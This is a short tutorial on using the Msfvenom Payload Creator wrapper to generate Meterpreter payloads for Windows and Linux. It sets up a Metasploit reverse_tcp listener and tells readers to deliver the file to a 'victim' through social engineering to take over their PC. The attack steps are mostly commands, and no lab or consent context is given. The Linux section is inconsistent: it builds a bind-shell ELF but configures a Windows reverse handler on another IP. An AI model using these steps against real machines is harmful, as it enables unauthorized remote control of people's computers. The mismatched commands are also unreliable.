Hack Remote Windows or Linux PC using MPC

Msfvenom Payload Creator (MPC) is a wrapper to generate multiple types of payloads, based on users’ choice. The idea is to be as simple as possible (only requiring one input) to produce their payload.
Fully automating msfvenom & Metasploit is the end goal (well as to be be able to automate MPC itself). The rest is to make the user’s life as easy as possible (e.g. IP selection menu, msfconsole resource file/commands, batch payload production and able to enter any argument in any order (in various formats/patterns)).
The only necessary input from the user should be defining the payload they want by either the platform (e.g. windows), or the file extension they wish the payload to have (e.g. exe).
 Note: This will NOT try to bypass any anti-virus solutions at any stage.
Open you kali Linux terminal and type the following command
https://github.com/g0tmi1k/mpc.git

After successful installation, open new terminal and type ./mpc.sh windows 192.168.1.2 (IP Address of your Kali Linux)
 It will automatically create Windows Meterpreter EXE and save in your mpc folder

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.2
exploit
Now send your exe files to victim using any social engineering technique. Now when the victim will use exe you will get the meterpreter of victim PC.

For Linux
./mpc.sh elf bind eth0 4444 verbose
 It will automatically create Linux Shell File and save in your mpc folder

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.4
exploit
Now send your  files to victim using any social engineering technique. Now when the victim will use your file you will get the session of victim PC.
